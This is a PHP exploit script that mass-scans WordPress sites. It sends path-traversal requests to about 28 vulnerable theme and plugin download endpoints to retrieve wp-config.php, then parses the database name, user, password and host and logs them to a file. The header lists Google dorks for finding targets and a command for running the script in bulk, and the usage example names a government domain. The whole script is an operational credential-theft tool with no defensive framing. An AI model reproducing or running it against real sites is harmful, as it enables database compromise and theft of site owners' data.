#!/usr/bin/php -q
<?php
# ===============================================================================
# NAME:                 Wordpress A.F.D Verification/ INURL - BRASIL
# TIPE:                 Arbitrary File Download
# Tested on:            Linux 
# EXECUTE:              php exploit.php www.target.gov.us
# OUTPUT:               WORDPRES_A_F_D.txt
# AUTOR:                Cleiton Pinheiro / NICK: GoogleINURL
# Blog:                 http://blog.inurl.com.br
# Twitter:              https://twitter.com/googleinurl
# Fanpage:              https://fb.com/InurlBrasil
# PASTEBIN:             http://pastebin.com/u/googleinurl
# GIT:                  https://github.com/googleinurl
# YOUTUBE               https://www.youtube.com/channel/UCFP-WEzs5Ikdqw0HBLImGGA
# PACKETSTORMSECURITY:: http://packetstormsecurity.com/user/googleinurl/
# 
# ------------------------------------------------------------------------------
#  Comand Exec Scanner INURLBR: 
# ./inurlbr.php --dork 'inurl:/wp-content/themes/' -q 1,6 -s save.txt --comand-all "php exploit.php _TARGET_"
# ------------------------------------------------------------------------------
# 
# Download Scanner INURLBR:
# https://github.com/googleinurl/SCANNER-INURLBR
# ------------------------------------------------------------------------------
#
# D O R K'S:
# ------------------------------------------------------------------------------
#  WordPress revslide Arbitrary File Download
#  Google Dork:: inurl:revslider_show_image -intext:revslider_show_image
# ------------------------------------------------------------------------------
# 
# WordPress Ultimatum Theme Arbitrary File Download
# Vendor Homepage:: http://ultimatumtheme.com/ultimatum-themes/s
# Google Dork:: "Index of" & /wp-content/themes/ultimatum
# ------------------------------------------------------------------------------
# 
# WordPress Medicate Theme Arbitrary File Download
# Vendor Homepage:: http://themeforest.net/item/medicate-responsive-medical-and-health-theme/3707916
# Google Dork:: "Index of" & /wp-content/themes/medicate/
# ------------------------------------------------------------------------------
# 
# WordPress Centum Theme Arbitrary File Download
# Vendor Homepage:: http://themeforest.net/item/centum-responsive-wordpress-theme/3216603
# Google Dork:: "Index of" & /wp-content/themes/Centum/
# ------------------------------------------------------------------------------
# 
# WordPress Avada Theme Arbitrary File Download
# Vendor Homepage:: http://themeforest.net/item/avada-responsive-multipurpose-theme/2833226
# Google Dork:: "Index of" & /wp-content/themes/Avada/
# ------------------------------------------------------------------------------
# 
# WordPress Striking Theme & E-Commerce Arbitrary File Download
# Vendor Homepage:: http://themeforest.net/item/striking-multiflex-ecommerce-responsive-wp-theme/128763
# Google Dork:: "Index of" & /wp-content/themes/striking_r/
# ------------------------------------------------------------------------------
# 
# WordPress Beach Apollo Arbitrary File Download
# Vendor Homepage:: https://www.authenticthemes.com/theme/apollo/
# Google Dork:: "Index of" & /wp-content/themes/beach_apollo/
# ------------------------------------------------------------------------------
# 
# WordPress index of ajax-store-locator 
# Google Dork:: inurl:ajax-store-locator
# Vendor Homepage:: http://codecanyon.net/item/ajax-store-locator-wordpress/5293356
# ------------------------------------------------------------------------------
# 
# WordPress cuckootap Theme Arbitrary File Download
# Google Dork:: "Index of" & /wp-content/themes/cuckootap/
# Vendor Homepage:: http://www.cuckoothemes.com/
# ------------------------------------------------------------------------------ 
# 
# WordPress IncredibleWP Theme Arbitrary File Download
# Vendor Homepage:: http://freelancewp.com/wordpress-theme/incredible-wp/
# Google Dork:: "Index of" & /wp-content/themes/IncredibleWP/
# ------------------------------------------------------------------------------ 
# 
# WordPress Ultimatum Theme Arbitrary File Download
# Vendor Homepage:: http://ultimatumtheme.com/ultimatum-themes/s
# Google Dork:: "Index of" & /wp-content/themes/ultimatum
# ------------------------------------------------------------------------------ 
# 
# WordPress Medicate Theme Arbitrary File Download
# Vendor Homepage:: http://themeforest.net/item/medicate-responsive-medical-and-health-theme/3707916
# Google Dork:: "Index of" & /wp-content/themes/medicate/
# ------------------------------------------------------------------------------ 
# 
# WordPress Centum Theme Arbitrary File Download
# Vendor Homepage:: http://themeforest.net/item/centum-responsive-wordpress-theme/3216603
# Google Dork:: "Index of" & /wp-content/themes/Centum/
# ------------------------------------------------------------------------------ 
# 
# WordPress Avada Theme Arbitrary File Download
# Vendor Homepage:: http://themeforest.net/item/avada-responsive-multipurpose-theme/2833226
# Google Dork:: "Index of" & /wp-content/themes/Avada/
# ------------------------------------------------------------------------------
#  
# WordPress Striking Theme & E-Commerce Arbitrary File Download
# Vendor Homepage:: http://themeforest.net/item/striking-multiflex-ecommerce-responsive-wp-theme/128763
# Google Dork:: "Index of" & /wp-content/themes/striking_r/
# ------------------------------------------------------------------------------ 
# 
# WordPress Beach Apollo Arbitrary File Download
# Vendor Homepage:: https://www.authenticthemes.com/theme/apollo/
# Google Dork:: "Index of" & /wp-content/themes/beach_apollo/
# ------------------------------------------------------------------------------
# 
# WordPress Trinity Theme Arbitrary File Download
# Vendor Homepage:: https://churchthemes.net/themes/trinity/
# Google Dork:: "Index of" & /wp-content/themes/trinity/
# ------------------------------------------------------------------------------
# 
# WordPress Lote27 Theme Arbitrary File Download
# Google Dork:: "Index of" & /wp-content/themes/lote27/
# ------------------------------------------------------------------------------
# 
# WordPress Revslider Theme Arbitrary File Download
# Vendor Homepage:: http://themeforest.net/item/cuckootap-one-page-parallax-wp-theme-plus-eshop/3512405
# Google Dork:: wp-admin & inurl:revslider_show_image
# ------------------------------------------------------------------------------
# 
# Wordpress plugin Justified Image Grid v2.0.1 LFD Exploiter 2015
# Vendor Homepage:: http://codecanyon.net/item/justified-image-grid-premium-wordpress-gallery/2594251
# Google Dork:: inurl:"/plugins/justified-image-grid"
# ------------------------------------------------------------------------------
# 
# Wordpress aspose-doc-exporter Plugin Arbitrary File Download Vulnerability
# Vendor Homepage:: https://wordpress.org/plugins/aspose-doc-exporter/developers/
# ------------------------------------------------------------------------------
# 
# WordPress Slider Revolution Responsive <= 4.1.4 Arbitrary File Download vulnerability
# Vendor Homepage:: http://codecanyon.net/item/slider-revolution-responsive-wordpress-plugin/2751380
# Google Dork:: revslider.php "index of"
# ------------------------------------------------------------------------------
#
# Wordpress Theme Divi Arbitrary File Download Vulnerability
# Vendor Homepage:: http://www.elegantthemes.com/gallery/divi/
# Google Dork:: inurl:wp-content/themes/Divi/
# ------------------------------------------------------------------------------
#
# WordPress Aspose Cloud eBook Generator File Download Vulnerability
# Vendor Homepage:: https://wordpress.org/plugins/aspose-cloud-ebook-generator/
# ------------------------------------------------------------------------------
#
# Wordpress Plugin 'WP Mobile Edition' Remote File Disclosure Vulnerability
# Vendor Homepage:: https://wordpress.org/plugins/wp-mobile-edition/
# Google Dork: inurl:?fdx_switcher=mobile
# ------------------------------------------------------------------------------
#
# WordPress WP-Mon Arbitrary File Download Vulnerability
# Vendor Homepage:: https://wordpress.org/plugins/wp-mon/
# Google Dork: inurl:"/wp-content/plugins/wp-mon"
# ------------------------------------------------------------------------------
#
# Wordpress MiwoFTP Plugin 1.0.5 suffers from arbitrary file download vulnerability
# Vendor Homepage:: http://www.miwisoft.com
# Google Dork: inurl:"php?page=miwoftp"
# ------------------------------------------------------------------------------
# http://i.imgur.com/45BFlNe.png
# ===============================================================================

$banner = "  
  _____ 
 (_____)    ____ _   _ _    _ _____  _                 ____                _ _ 
 (() ())  |_   _| \ | | |  | |  __ \| |               |  _ \              (_) |
  \   /     | | |  \| | |  | | |__) | |       ______  | |_) |_ __ __ _ ___ _| |
   \ /      | | | . ` | |  | |  _  /| |      |______| |  _ <| '__/ _` / __| | |
   /=\     _| |_| |\  | |__| | | \ \| |____           | |_) | | | (_| \__ \ | |
  [___]   |_____|_| \_|\____/|_|  \_\______|          |____/|_|  \__,_|___/_|_| 
  \n\033[1;37m0xNeither war between hackers, nor peace for the system.\033[0m\r
";

error_reporting(1);
set_time_limit(0);
ini_set('display_errors', 1);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
ob_implicit_flush(true);
ob_end_flush();

function __plus() {

    ob_flush();
    flush();
}

print empty($argv[1]) ? exit("{$banner}0x[ERROR]: SET URL / Execute: php exploit.php www.target.gov.us\n") : NULL;
$argv[1] = isset($argv[1]) && strstr($argv[1], 'http') ? $argv[1] : "http://{$argv[1]}";
!filter_var($argv[1], FILTER_VALIDATE_URL) ?  exit("{$banner}0x[ERROR]: SET URL / Execute: php exploit.php www.target.gov.us\n") : NULL;

print "\r\n{$banner}0x[EXPLOIT NAME]: WORDPRESS A.F.D / INURL - BRASIL";
print "\n------------------------------------------------------------------------------------------------------------------";
__plus();
$users = file_get_contents("{$argv[1]}/?author=1");
__plus();
preg_match('/<title>(.*?)<\/title>/si', $users, $user);
$wpuser = explode('|', $user[1]);
$headers = get_headers($argv[1], 1);
__plus();
print "\n0x ". date("h:m:s") ." [INFO][COD]:: ";
print $headers[0] . (isset($headers[1]) ? ' -> ' . $headers[1] : NULL);
print "\n0x ". date("h:m:s") ." [INFO][Server]:: ";
is_array($headers['Server']) ? print_r($headers['Server'][0]) : print_r($headers['Server']);
print "\n0x ". date("h:m:s") ." [INFO][X-Pingback]:: ";
is_array($headers['X-Pingback']) ? print_r($headers['X-Pingback'][0]) : print_r($headers['X-Pingback']);
print "\n0x ". date("h:m:s") ." [INFO][X-Powered-By]:: ";
is_array($headers['X-Powered-By']) ? print_r($headers['X-Powered-By'][0]) : print_r($headers['X-Powered-By']);
print_r("\n0x ". date("h:m:s") ." [INFO][TARGET]:: {$argv[1]} | [WP USER]:: " . str_replace("\n", '', $wpuser[0]));
print "\n0x ". date("h:m:s") ." [INFO][OUTPUT FILE]:: WORDPRESS_A_F_D.txt\n";
__plus();

__request($argv[1], '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php');

__request($argv[1], '/wp-content/force-download.php?file=../wp-config.php');

__request($argv[1], '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php');

__request($argv[1], '/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php');

__request($argv[1], '/wp-content/themes/markant/download.php?file=../../wp-config.php');

__request($argv[1], '/wp-content/themes/yakimabait/download.php?file=./wp-config.php');

__request($argv[1], '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php');

__request($argv[1], '/wp-content/themes/felis/download.php?file=../wp-config.php');

__request($argv[1], '/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php');

__request($argv[1], '/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php');

__request($argv[1], '/wp-content/themes/epic/includes/download.php?file=wp-config.php');

__request($argv[1], '/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php');

__request($argv[1], '/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php');

__request($argv[1], '/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php');

__request($argv[1], '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php');

__request($argv[1], '/wp-content/themes/lote27/download.php?download=../../../wp-config.php');

__request($argv[1], '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php');

__request($argv[1], '/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php');

__request($argv[1], '/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php');

__request($argv[1], '/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php');

__request($argv[1], '/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php');

__request($argv[1], '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php');

__request($argv[1], '/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php');

__request($argv[1], '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php');

__request($argv[1], '/wp-content/plugins/wp-mon/assets/download.php?type=octet/stream&path=../../../../&name=wp-config.php');

__request($argv[1], '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes');

__request($argv[1], '/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php');

__request($argv[1], '/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php');


function __request($url, $plugin) {

    $objcurl = curl_init();
    $caminho = NULL;
    $status = array();

    curl_setopt($objcurl, CURLOPT_URL, $url . $plugin);
    curl_setopt($objcurl, CURLOPT_HEADER, 1);
    curl_setopt($objcurl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($objcurl, CURLOPT_USERAGENT, "::INURLBR::/1.0.1 (compatible; MSIE 5.01; Linux 5.0)");
    curl_setopt($objcurl, CURLOPT_CONNECTTIMEOUT, 20);
    $corpo = curl_exec($objcurl);

    if (preg_match_all("(<b>/.*./wp-content/)", $corpo, $caminho)) {

        return __request($url, "{$plugin}&file=" . str_replace('wp-content/', '', $caminho[0][0]) . "wp-config.php");
    }
__plus();

    if (preg_match("#DB_NAME#i", $corpo) || preg_match("#readfile(#i", $corpo)) {

//-----------------------------------------------------------------------------
        preg_match_all("(DB_NAME.*')", $corpo, $status['DB_NAME']);
        preg_match_all("(DB_USER.*')", $corpo, $status['DB_USER']);
        preg_match_all("(DB_PASSWORD.*')", $corpo, $status['DB_PASSWORD']);
        preg_match_all("(DB_HOST.*')", $corpo, $status['DB_HOST']);
        preg_match_all("(DB_CHARSET.*')", $corpo, $status['DB_CHARSET']);
//-----------------------------------------------------------------------------
__plus();
        $res = "\n------------------------------------------------------------------------------------------------------------------\n\033[0;32m0x ". date("h:m:s") ." [INFO][VULN]::    \033[1;37m [ " . date("d-m-Y H:i:s") . " ]\n";
        $res.= ("\033[0;32m0x ". date("h:m:s") ." [INFO][VULN][DB]::\033[1;37m " . $status['DB_NAME'][0][0]);
        $res.= ("::" . $status['DB_USER'][0][0]);
        $res.= ("::" . $status['DB_PASSWORD'][0][0]);
        $res.= ("::" . $status['DB_HOST'][0][0]);
        $res.= ("::" . $status['DB_CHARSET'][0][0]);
        $res.= "\n\033[0;32m0x ". date("h:m:s") ." [INFO][VULN][URL]::\033[1;37m{$url}{$plugin}\033[0m";
        $res.= "\n------------------------------------------------------------------------------------------------------------------\n\033[0m";
        print $res;
        $res = str_replace('[1;37m','',str_replace('[0m','',str_replace('[0;32m','',$res)));
        file_put_contents('WORDPRESS_A_F_D.txt', "{$res}\n", FILE_APPEND);
__plus();
    } else {

        print "\n\033[1;31m0x ". date("h:m:s") ." [INFO][NOT VULN]::\033[1;37m {$url}{$plugin} \n\033[0m";
    }
    curl_close($objcurl);
__plus();
}
